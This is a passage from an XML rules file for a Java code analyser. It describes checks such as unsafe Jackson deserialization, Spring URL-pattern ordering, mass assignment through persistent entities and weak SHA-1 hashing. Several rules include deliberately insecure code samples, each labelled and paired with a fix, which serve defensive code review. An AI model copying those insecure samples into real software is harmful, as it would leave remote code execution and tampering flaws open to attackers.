            last one of the &lt;code&gt;switch&lt;/code&gt;'s cases.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            switch (param) {
            case 0:
            doSomething();
            break;
            default: // default clause should be the last one
            error();
            break;
            case 1:
            doSomethingElse();
            break;
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            switch (param) {
            case 0:
            doSomething();
            break;
            case 1:
            doSomethingElse();
            break;
            default:
            error();
            break;
            }
            &lt;/pre&gt;
        </description>
    </rule>

    <rule key='S4544' priority='CRITICAL'>
        <configKey>S4544</configKey>
        <name>Using unsafe Jackson deserialization configuration is security-sensitive</name>
        <description>
            &lt;p&gt;Using unsafe Jackson deserialization configuration is security-sensitive. It has led in the past to
            the following vulnerabilities:&lt;/p&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-4995&quot;&gt;CVE-2017-4995&lt;/a&gt;
            &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-19362&quot;&gt;CVE-2018-19362&lt;/a&gt;
            &lt;/li&gt;
            &lt;/ul&gt;
            &lt;p&gt;When Jackson is configured to allow Polymorphic Type Handling (aka PTH), formerly known as
            Polymorphic Deserialization, &quot;deserialization gadgets&quot;
            may allow an attacker to perform remote code execution. &lt;/p&gt;
            &lt;p&gt;This rule raises an issue when:&lt;/p&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;code&gt;enableDefaultTyping()&lt;/code&gt; is called on an instance of &lt;code&gt;com.fasterxml.jackson.databind.ObjectMapper&lt;/code&gt;
            or
            &lt;code&gt;org.codehaus.jackson.map.ObjectMapper&lt;/code&gt;. &lt;/li&gt;
            &lt;li&gt; or when the annotation &lt;code&gt;@JsonTypeInfo&lt;/code&gt; is set at class or field levels and
            configured with &lt;code&gt;use = JsonTypeInfo.Id.CLASS)&lt;/code&gt;
            or &lt;code&gt;use = Id.MINIMAL_CLASS&lt;/code&gt;. &lt;/li&gt;
            &lt;/ul&gt;
            &lt;h2&gt;Ask Yourself Whether&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; You configured the Jackson deserializer as mentioned above. &lt;/li&gt;
            &lt;li&gt; The serialized data might come from an untrusted source. &lt;/li&gt;
            &lt;/ul&gt;
            &lt;p&gt;There is a risk if you answered yes to any of those questions.&lt;/p&gt;
            &lt;h2&gt;Recommended Secure Coding Practices&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; Use the latest patch versions of &lt;code&gt;jackson-databind&lt;/code&gt; blocking the already
            discovered &quot;deserialization gadgets&quot;. &lt;/li&gt;
            &lt;li&gt; Avoid using the default typing configuration: &lt;code&gt;ObjectMapper.enableDefaultTyping()&lt;/code&gt;.
            &lt;/li&gt;
            &lt;li&gt; If possible, use &lt;code&gt;@JsonTypeInfo(use = Id.NAME)&lt;/code&gt; instead of &lt;code&gt;@JsonTypeInfo(use
            = Id.CLASS)&lt;/code&gt; or &lt;code&gt;@JsonTypeInfo(use =
            Id. MINIMAL_CLASS)&lt;/code&gt; and so rely on &lt;code&gt;@JsonTypeName&lt;/code&gt; and &lt;code&gt;@JsonSubTypes&lt;/code&gt;.
            &lt;/li&gt;
            &lt;/ul&gt;
            &lt;h2&gt;Sensitive Code Example&lt;/h2&gt;
            &lt;pre&gt;
            ObjectMapper mapper = new ObjectMapper();
            mapper.enableDefaultTyping(); // Sensitive
            &lt;/pre&gt;
            &lt;pre&gt;
            @JsonTypeInfo(use = Id.CLASS) // Sensitive
            abstract class PhoneNumber {
            }
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;https://www.owasp.org/index.php/Top_10-2017_A8-Insecure_Deserialization&quot;&gt;OWASP
            Top 10 2017 Category A8&lt;/a&gt; - Insecure Deserialization
            &lt;/li&gt;
            &lt;li&gt; OWASP - &lt;a href=&quot;https://www.owasp.org/index.php/Deserialization_of_untrusted_data&quot;&gt;Deserialization
            of untrusted data&lt;/a&gt; &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://cwe.mitre.org/data/definitions/502.html&quot;&gt;MITRE, CWE-502&lt;/a&gt;
            - Deserialization of Untrusted Data &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062&quot;&gt;On
            Jackson CVEs: Don’t
            Panic&lt;/a&gt; &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://nvd.nist.gov/vuln/detail/CVE-2017-15095&quot;&gt;CVE-2017-1509&lt;/a&gt;
            &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://nvd.nist.gov/vuln/detail/CVE-2017-7525&quot;&gt;CVE-2017-7525&lt;/a&gt;
            &lt;/li&gt;
            &lt;li&gt; Derived from FindSecBugs rule &lt;a
            href=&quot;https://find-sec-bugs.github.io/bugs.htm#JACKSON_UNSAFE_DESERIALIZATION&quot;&gt;JACKSON_UNSAFE_DESERIALIZATION&lt;/a&gt;
            &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>cwe</tag>
        <tag>owasp-a8</tag>
        <securityStandards>
            <cwe>502</cwe>
            <OWASP>A8</OWASP>
        </securityStandards>
    </rule>

    <rule key='S4601' priority='CRITICAL'>
        <configKey>S4601</configKey>
        <name>&quot;HttpSecurity&quot; URL patterns should be correctly ordered</name>
        <description>
            &lt;p&gt;URL patterns configured on a &lt;code&gt;HttpSecurity.authorizeRequests()&lt;/code&gt; method are
            considered in the order they were declared. It's easy to do a
            mistake and to declare a less restrictive configuration before a more restrictive one. Therefore, it's
            required to review the order of the
            &quot;antMatchers&quot; declarations. The &lt;code&gt;/**&lt;/code&gt; one should be the last one if it is
            declared.&lt;/p&gt;
            &lt;p&gt;This rule raises an issue when:&lt;/p&gt;
            &lt;ul&gt;
            &lt;li&gt; A pattern is preceded by another that ends with &lt;code&gt;**&lt;/code&gt; and has the same
            beginning. E.g.: &lt;code&gt;/page*-admin/db/**&lt;/code&gt; is after
            &lt;code&gt;/page*-admin/**&lt;/code&gt; &lt;/li&gt;
            &lt;li&gt; A pattern without wildcard characters is preceded by another that matches. E.g.: &lt;code&gt;/page-index/db&lt;/code&gt;
            is after &lt;code&gt;/page*/**&lt;/code&gt;
            &lt;/li&gt;
            &lt;/ul&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            protected void configure(HttpSecurity http) throws Exception {
            http.authorizeRequests()
            .antMatchers(&quot;/resources/**&quot;, &quot;/signup&quot;, &quot;/about&quot;).permitAll() // Compliant
            .antMatchers(&quot;/admin/**&quot;).hasRole(&quot;ADMIN&quot;)
            .antMatchers(&quot;/admin/login&quot;).permitAll() // Noncompliant; the pattern &quot;/admin/login&quot;
            should occurs before &quot;/admin/**&quot;
            .antMatchers(&quot;/**&quot;, &quot;/home&quot;).permitAll()
            .antMatchers(&quot;/db/**&quot;).access(&quot;hasRole('ADMIN') and hasRole('DBA')&quot;) // Noncompliant;
            the pattern &quot;/db/**&quot; should occurs before &quot;/**&quot;
            .and().formLogin().loginPage(&quot;/login&quot;).permitAll().and().logout().permitAll();
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            protected void configure(HttpSecurity http) throws Exception {
            http.authorizeRequests()
            .antMatchers(&quot;/resources/**&quot;, &quot;/signup&quot;, &quot;/about&quot;).permitAll() // Compliant
            .antMatchers(&quot;/admin/login&quot;).permitAll()
            .antMatchers(&quot;/admin/**&quot;).hasRole(&quot;ADMIN&quot;) // Compliant
            .antMatchers(&quot;/db/**&quot;).access(&quot;hasRole('ADMIN') and hasRole('DBA')&quot;)
            .antMatchers(&quot;/**&quot;, &quot;/home&quot;).permitAll() // Compliant; &quot;/**&quot; is the last one
            .and().formLogin().loginPage(&quot;/login&quot;).permitAll().and().logout().permitAll();
            }
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration&quot;&gt;OWASP
            Top 10 2017 Category A6&lt;/a&gt; - Security
            Misconfiguration &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>owasp-a6</tag>
        <tag>spring</tag>
        <securityStandards>
            <OWASP>A6</OWASP>
        </securityStandards>
    </rule>

    <rule key='S4602' priority='BLOCKER'>
        <configKey>S4602</configKey>
        <name>&quot;@SpringBootApplication&quot; and &quot;@ComponentScan&quot; should not be used in the default
            package
        </name>
        <description>
            &lt;p&gt;&lt;code&gt;@ComponentScan&lt;/code&gt; is used to determine which Spring Beans are available in
            the application context. The packages to scan can be
            configured thanks to the &lt;code&gt;basePackageClasses&lt;/code&gt; or &lt;code&gt;basePackages&lt;/code&gt;
            (or its alias &lt;code&gt;value&lt;/code&gt;) parameters. If neither
            parameter is configured, &lt;code&gt;@ComponentScan&lt;/code&gt; will consider only the package of the class
            annotated with it. When &lt;code&gt;@ComponentScan&lt;/code&gt;
            is used on a class belonging to the default package, the entire classpath will be scanned.&lt;/p&gt;
            &lt;p&gt;This will slow-down the start-up of the application and it is likely the application will fail to
            start with an
            &lt;code&gt;BeanDefinitionStoreException&lt;/code&gt; because you ended up scanning the Spring Framework
            package itself.&lt;/p&gt;
            &lt;p&gt;This rule raises an issue when:&lt;/p&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;code&gt;@ComponentScan&lt;/code&gt;, &lt;code&gt;@SpringBootApplication&lt;/code&gt; and &lt;code&gt;@ServletComponentScan&lt;/code&gt;
            are used on a class belonging to the
            default package &lt;/li&gt;
            &lt;li&gt; &lt;code&gt;@ComponentScan&lt;/code&gt; is explicitly configured with the default package &lt;/li&gt;
            &lt;/ul&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            import org.springframework.boot.SpringApplication;

            @SpringBootApplication // Noncompliant; RootBootApp is declared in the default package
            public class RootBootApp {
            ...
            }
            &lt;/pre&gt;
            &lt;pre&gt;
            @ComponentScan(&quot;&quot;)
            public class Application {
            ...
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            package hello;

            import org.springframework.boot.SpringApplication;

            @SpringBootApplication // Compliant; RootBootApp belongs to the &quot;hello&quot; package
            public class RootBootApp {
            ...
            }
            &lt;/pre&gt;
        </description>
        <tag>spring</tag>
    </rule>

    <rule key='S4635' priority='CRITICAL'>
        <configKey>S4635</configKey>
        <name>String offset-based methods should be preferred for finding substrings from offsets</name>
        <description>
            &lt;p&gt;Looking for a given substring starting from a specified offset can be achieved by such code: &lt;code&gt;str.substring(beginIndex).indexOf(char1)&lt;/code&gt;.
            This works well, but it creates a new &lt;code&gt;String&lt;/code&gt; for each call to the &lt;code&gt;substring&lt;/code&gt;
            method. When this is done in a loop, a lot of
            &lt;code&gt;Strings&lt;/code&gt; are created for nothing, which can lead to performance problems if &lt;code&gt;str&lt;/code&gt;
            is large.&lt;/p&gt;
            &lt;p&gt;To avoid performance problems, &lt;code&gt;String.substring(beginIndex)&lt;/code&gt; should not be
            chained with the following methods:&lt;/p&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;code&gt;indexOf(int ch)&lt;/code&gt; &lt;/li&gt;
            &lt;li&gt; &lt;code&gt;indexOf(String str)&lt;/code&gt; &lt;/li&gt;
            &lt;li&gt; &lt;code&gt;lastIndexOf(int ch)&lt;/code&gt; &lt;/li&gt;
            &lt;li&gt; &lt;code&gt;lastIndexOf(String str)&lt;/code&gt; &lt;/li&gt;
            &lt;li&gt; &lt;code&gt;startsWith(String prefix)&lt;/code&gt; &lt;/li&gt;
            &lt;/ul&gt;
            &lt;p&gt;For each of these methods, another method with an additional parameter is available to specify an
            offset.&lt;/p&gt;
            &lt;p&gt;Using these methods gives the same result while avoiding the creation of additional &lt;code&gt;String&lt;/code&gt;
            instances.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            str.substring(beginIndex).indexOf(char1); // Noncompliant; a new String is going to be created by &quot;substring&quot;
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            str.indexOf(char1, beginIndex);
            &lt;/pre&gt;
        </description>
        <tag>performance</tag>
    </rule>

    <rule key='S4682' priority='MINOR'>
        <configKey>S4682</configKey>
        <name>&quot;@CheckForNull&quot; or &quot;@Nullable&quot; should not be used on primitive types</name>
        <description>
            &lt;p&gt;By definition, primitive types are not Objects and so they can't be &lt;code&gt;null&lt;/code&gt;.
            Adding &lt;code&gt;@CheckForNull&lt;/code&gt; or &lt;code&gt;@Nullable&lt;/code&gt;
            on primitive types adds confusion and is useless.&lt;/p&gt;
            &lt;p&gt;This rule raises an issue when &lt;code&gt;@CheckForNull&lt;/code&gt; or &lt;code&gt;@Nullable&lt;/code&gt;
            is set on a method returning a primitive type: byte, short,
            int, long, float, double, boolean, char.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            @CheckForNull
            boolean isFoo() {
            ...
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            boolean isFoo() {
            ...
            }
            &lt;/pre&gt;
        </description>
    </rule>

    <rule key='S4684' priority='CRITICAL'>
        <configKey>S4684</configKey>
        <name>Persistent entities should not be used as arguments of &quot;@RequestMapping&quot; methods</name>
        <description>
            &lt;p&gt;On one side, Spring MVC automatically bind request parameters to beans declared as arguments of
            methods annotated with
            &lt;code&gt;@RequestMapping&lt;/code&gt;. Because of this automatic binding feature, it's possible to feed
            some unexpected fields on the arguments of the
            &lt;code&gt;@RequestMapping&lt;/code&gt; annotated methods. &lt;/p&gt;
            &lt;p&gt;On the other end, persistent objects (&lt;code&gt;@Entity&lt;/code&gt; or &lt;code&gt;@Document&lt;/code&gt;)
            are linked to the underlying database and updated
            automatically by a persistence framework, such as Hibernate, JPA or Spring Data MongoDB.&lt;/p&gt;
            &lt;p&gt;These two facts combined together can lead to malicious attack: if a persistent object is used as
            an argument of a method annotated with
            &lt;code&gt;@RequestMapping&lt;/code&gt;, it's possible from a specially crafted user input, to change the
            content of unexpected fields into the database.&lt;/p&gt;
            &lt;p&gt;For this reason, using &lt;code&gt;@Entity&lt;/code&gt; or &lt;code&gt;@Document&lt;/code&gt;
            objects as arguments of methods annotated with &lt;code&gt;@RequestMapping&lt;/code&gt;
            should be avoided.&lt;/p&gt;
            &lt;p&gt;In addition to &lt;code&gt;@RequestMapping&lt;/code&gt;, this rule also considers the annotations
            introduced in Spring Framework 4.3: &lt;code&gt;@GetMapping&lt;/code&gt;,
            &lt;code&gt;@PostMapping&lt;/code&gt;, &lt;code&gt;@PutMapping&lt;/code&gt;, &lt;code&gt;@DeleteMapping&lt;/code&gt;,
            &lt;code&gt;@PatchMapping&lt;/code&gt;.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            import javax.persistence.Entity;

            @Entity
            public class Wish {
            Long productId;
            Long quantity;
            Client client;
            }

            @Entity
            public class Client {
            String clientId;
            String name;
            String password;
            }

            import org.springframework.stereotype.Controller;
            import org.springframework.web.bind.annotation.RequestMapping;

            @Controller
            public class WishListController {

            @PostMapping(path = &quot;/saveForLater&quot;)
            public String saveForLater(Wish wish) {
            session.save(wish);
            }

            @RequestMapping(path = &quot;/saveForLater&quot;, method = RequestMethod.POST)
            public String saveForLater(Wish wish) {
            session.save(wish);
            }
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            public class WishDTO {
            Long productId;
            Long quantity;
            Long clientId;
            }

            import org.springframework.stereotype.Controller;
            import org.springframework.web.bind.annotation.RequestMapping;

            @Controller
            public class PurchaseOrderController {

            @PostMapping(path = &quot;/saveForLater&quot;)
            public String saveForLater(WishDTO wish) {
            Wish persistentWish = new Wish();
            // do the mapping between &quot;wish&quot; and &quot;persistentWish&quot;
            [...]
            session.save(persistentWish);
            }

            @RequestMapping(path = &quot;/saveForLater&quot;, method = RequestMethod.POST)
            public String saveForLater(WishDTO wish) {
            Wish persistentWish = new Wish();
            // do the mapping between &quot;wish&quot; and &quot;persistentWish&quot;
            [...]
            session.save(persistentWish);
            }
            }
            &lt;/pre&gt;
            &lt;h2&gt;Exceptions&lt;/h2&gt;
            &lt;p&gt;No issue is reported when the parameter is annotated with &lt;code&gt;@PathVariable&lt;/code&gt;
            from Spring Framework, since the lookup will be done via id,
            the object cannot be forged on client side.&lt;/p&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;https://www.owasp.org/index.php/Top_10-2017_A5-Broken_Access_Control&quot;&gt;OWASP
            Top 10 2017 Category A5&lt;/a&gt; - Broken Access Control &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://cwe.mitre.org/data/definitions/915.html&quot;&gt;MITRE, CWE-915&lt;/a&gt;
            - Improperly Controlled Modification of Dynamically-Determined
            Object Attributes &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://o2platform.files.wordpress.com/2011/07/ounce_springframework_vulnerabilities.pdf&quot;&gt;Two
            Security Vulnerabilities in the Spring
            Framework’s MVC by Ryan Berg and Dinis Cruz&lt;/a&gt; &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>cwe</tag>
        <tag>owasp-a5</tag>
        <tag>spring</tag>
        <securityStandards>
            <cwe>915</cwe>
            <OWASP>A5</OWASP>
        </securityStandards>
    </rule>

    <rule key='S4719' priority='MINOR'>
        <configKey>S4719</configKey>
        <name>&quot;StandardCharsets&quot; constants should be preferred</name>
        <description>
            &lt;p&gt;JDK7 introduced the class &lt;code&gt;java.nio.charset.StandardCharsets&lt;/code&gt;. It provides
            constants for all charsets that are guaranteed to be
            available on every implementation of the Java platform.&lt;/p&gt;
            &lt;ul&gt;
            &lt;li&gt; ISO_8859_1 &lt;/li&gt;
            &lt;li&gt; US_ASCII &lt;/li&gt;
            &lt;li&gt; UTF_16 &lt;/li&gt;
            &lt;li&gt; UTF_16BE &lt;/li&gt;
            &lt;li&gt; UTF_16LE &lt;/li&gt;
            &lt;li&gt; UTF_8 &lt;/li&gt;
            &lt;/ul&gt;
            &lt;p&gt;These constants should be preferred to:&lt;/p&gt;
            &lt;ul&gt;
            &lt;li&gt; the use of a String such as &quot;UTF-8&quot; which has the drawback of requiring the &lt;code&gt;catch&lt;/code&gt;/&lt;code&gt;throw&lt;/code&gt;
            of an
            &lt;code&gt;UnsupportedEncodingException&lt;/code&gt; that will never actually happen &lt;/li&gt;
            &lt;li&gt; the use of Guava’s &lt;code&gt;Charsets&lt;/code&gt; class, which has been obsolete since JDK7
            &lt;/li&gt;
            &lt;/ul&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            try {
            byte[] bytes = string.getBytes(&quot;UTF-8&quot;); // Noncompliant; use a String instead of
            StandardCharsets.UTF_8
            } catch (UnsupportedEncodingException e) {
            throw new AssertionError(e);
            }
            // ...
            byte[] bytes = string.getBytes(Charsets.UTF_8); // Noncompliant; Guava way obsolete since JDK7
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            byte[] bytes = string.getBytes(StandardCharsets.UTF_8)
            &lt;/pre&gt;
        </description>
        <tag>clumsy</tag>
        <tag>java7</tag>
    </rule>

    <rule key='S4738' priority='MAJOR'>
        <configKey>S4738</configKey>
        <name>Java features should be preferred to Guava</name>
        <description>
            &lt;p&gt;Some Guava features were really useful for Java 7 application because Guava was bringing APIs
            missing in the JDK. Java 8 fixed some of these
            limitations. When migrating an application to Java 8 or even when starting a new one, it's recommended to
            prefer Java 8 APIs over Guava ones to ease
            its maintenance: developers don't need to learn how to use two APIs and can stick to the standard one.&lt;/p&gt;
            &lt;p&gt;Java 9 brought even more useful methods to the standard Java library and if Java version is equal
            to or higher than 9, these standard methods
            should be used.&lt;/p&gt;
            &lt;p&gt;This rule raises an issue when the following Guava APIs are used:&lt;/p&gt;
            &lt;table&gt;
            &lt;tbody&gt;
            &lt;tr&gt;
            &lt;th&gt; Guava API &lt;/th&gt;
            &lt;th&gt; Java 8 API &lt;/th&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt; com.google.common.io.BaseEncoding#base64() &lt;/td&gt;
            &lt;td&gt; java.util.Base64 &lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt; com.google.common.io.BaseEncoding#base64Url() &lt;/td&gt;
            &lt;td&gt; java.util.Base64 &lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt; com.google.common.base.Joiner.on() &lt;/td&gt;
            &lt;td&gt; java.lang.String#join() or java.util.stream.Collectors#joining() &lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt; com.google.common.base.Optional#of() &lt;/td&gt;
            &lt;td&gt; java.util.Optional#of() &lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt; com.google.common.base.Optional#absent() &lt;/td&gt;
            &lt;td&gt; java.util.Optional#empty() &lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt; com.google.common.base.Optional#fromNullable() &lt;/td&gt;
            &lt;td&gt; java.util.Optional#ofNullable() &lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt; com.google.common.base.Optional &lt;/td&gt;
            &lt;td&gt; java.util.Optional &lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt; com.google.common.base.Predicate &lt;/td&gt;
            &lt;td&gt; java.util.function.Predicate &lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt; com.google.common.base.Function &lt;/td&gt;
            &lt;td&gt; java.util.function.Function &lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt; com.google.common.base.Supplier &lt;/td&gt;
            &lt;td&gt; java.util.function.Supplier &lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt; com.google.common.io.Files.createTempDir &lt;/td&gt;
            &lt;td&gt; java.nio.file.Files.createTempDirectory &lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;th&gt; Guava API &lt;/th&gt;
            &lt;th&gt; Java 9 API &lt;/th&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt; com.google.common.collect.ImmutableSet#of() &lt;/td&gt;
            &lt;td&gt; java.util.Set#of() &lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt; com.google.common.collect.ImmutableList#of() &lt;/td&gt;
            &lt;td&gt; java.util.List#of() &lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt; com.google.common.collect.ImmutableMap#of() &lt;/td&gt;
            &lt;td&gt; java.util.Map#of() or java.util.Map#ofEntries()&lt;/td&gt;
            &lt;/tr&gt;
            &lt;/tbody&gt;
            &lt;/table&gt;
        </description>
        <tag>guava</tag>
        <tag>java8</tag>
        <tag>java9</tag>
    </rule>

    <rule key='S4790' priority='CRITICAL'>
        <configKey>S4790</configKey>
        <name>Using weak hashing algorithms is security-sensitive</name>
        <description>
            &lt;p&gt;Cryptographic hash algorithms such as &lt;code&gt;MD2&lt;/code&gt;, &lt;code&gt;MD4&lt;/code&gt;,
            &lt;code&gt;MD5&lt;/code&gt;, &lt;code&gt;MD6&lt;/code&gt;, &lt;code&gt;HAVAL-128&lt;/code&gt;,
            &lt;code&gt;HMAC-MD5&lt;/code&gt;, &lt;code&gt;DSA&lt;/code&gt; (which uses &lt;code&gt;SHA-1&lt;/code&gt;),
            &lt;code&gt;RIPEMD&lt;/code&gt;, &lt;code&gt;RIPEMD-128&lt;/code&gt;, &lt;code&gt;RIPEMD-160&lt;/code&gt;,
            &lt;code&gt;HMACRIPEMD160&lt;/code&gt; and &lt;code&gt;SHA-1&lt;/code&gt; are no longer considered secure,
            because it is possible to have &lt;code&gt;collisions&lt;/code&gt; (little
            computational effort is enough to find two or more different inputs that produce the same hash).&lt;/p&gt;
            &lt;h2&gt;Ask Yourself Whether&lt;/h2&gt;
            &lt;p&gt;The hashed value is used in a security context like:&lt;/p&gt;
            &lt;ul&gt;
            &lt;li&gt; User-password storage. &lt;/li&gt;
            &lt;li&gt; Security token generation (used to confirm e-mail when registering on a website, reset password,
            etc ...). &lt;/li&gt;
            &lt;li&gt; To compute some message integrity. &lt;/li&gt;
            &lt;/ul&gt;
            &lt;p&gt;There is a risk if you answered yes to any of those questions.&lt;/p&gt;
            &lt;h2&gt;Recommended Secure Coding Practices&lt;/h2&gt;
            &lt;p&gt;Safer alternatives, such as &lt;code&gt;SHA-256&lt;/code&gt;, &lt;code&gt;SHA-512&lt;/code&gt;,
            &lt;code&gt;SHA-3&lt;/code&gt; are recommended, and for password hashing, it's even
            better to use algorithms that do not compute too &quot;quickly&quot;, like &lt;code&gt;bcrypt&lt;/code&gt;,
            &lt;code&gt;scrypt&lt;/code&gt;, &lt;code&gt;argon2&lt;/code&gt; or &lt;code&gt;pbkdf2&lt;/code&gt;
            because it slows down &lt;code&gt;brute force attacks&lt;/code&gt;.&lt;/p&gt;
            &lt;h2&gt;Sensitive Code Example&lt;/h2&gt;
            &lt;pre&gt;
            MessageDigest md1 = MessageDigest.getInstance(&quot;SHA&quot;); // Sensitive: SHA is not a standard name,
            for most security providers it's an alias of SHA-1
            MessageDigest md2 = MessageDigest.getInstance(&quot;SHA1&quot;); // Sensitive
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            MessageDigest md1 = MessageDigest.getInstance(&quot;SHA-512&quot;); // Compliant
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure&quot;&gt;OWASP
            Top 10 2017 Category A3&lt;/a&gt; - Sensitive Data Exposure
            &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration&quot;&gt;OWASP
            Top 10 2017 Category A6&lt;/a&gt; - Security
            Misconfiguration &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://cwe.mitre.org/data/definitions/327.html&quot;&gt;MITRE, CWE-327&lt;/a&gt;
            - Use of a Broken or Risky Cryptographic Algorithm &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://cwe.mitre.org/data/definitions/916.html&quot;&gt;MITRE, CWE-916&lt;/a&gt;
            - Use of Password Hash With Insufficient Computational Effort
            &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://www.sans.org/top25-software-errors/#cat3&quot;&gt;SANS Top 25&lt;/a&gt;
            - Porous Defenses &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>cwe</tag>
        <tag>owasp-a3</tag>
        <tag>owasp-a6</tag>
        <tag>sans-top25-porous</tag>
        <tag>spring</tag>
        <securityStandards>
            <cwe>759,760,916,328,327</cwe>
            <OWASP>A3,A6</OWASP>
        </securityStandards>
    </rule>

    <rule key='S4792' priority='CRITICAL'>
        <configKey>S4792</configKey>
        <name>Configuring loggers is security-sensitive</name>
        <description>
            &lt;p&gt;Configuring loggers is security-sensitive. It has led in the past to the following vulnerabilities:&lt;/p&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-0285&quot;&gt;CVE-2018-0285&lt;/a&gt;
            &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2000-1127&quot;&gt;CVE-2000-1127&lt;/a&gt;
            &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-15113&quot;&gt;CVE-2017-15113&lt;/a&gt;
            &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5742&quot;&gt;CVE-2015-5742&lt;/a&gt;
            &lt;/li&gt;
            &lt;/ul&gt;
            &lt;p&gt;Logs are useful before, during and after a security incident.&lt;/p&gt;
            &lt;ul&gt;
            &lt;li&gt; Attackers will most of the time start their nefarious work by probing the system for
            vulnerabilities. Monitoring this activity and stopping it
            is the first step to prevent an attack from ever happening. &lt;/li&gt;
            &lt;li&gt; In case of a successful attack, logs should contain enough information to understand what damage
            an attacker may have inflicted. &lt;/li&gt;
            &lt;/ul&gt;
            &lt;p&gt;Logs are also a target for attackers because they might contain sensitive information. Configuring
            loggers has an impact on the type of information
            logged and how they are logged.&lt;/p&gt;
            &lt;p&gt;This rule flags for review code that initiates loggers configuration. The goal is to guide security
            code reviews.&lt;/p&gt;
            &lt;h2&gt;Ask Yourself Whether&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; unauthorized users might have access to the logs, either because they are stored in an insecure
            location or because the application gives
            access to them. &lt;/li&gt;
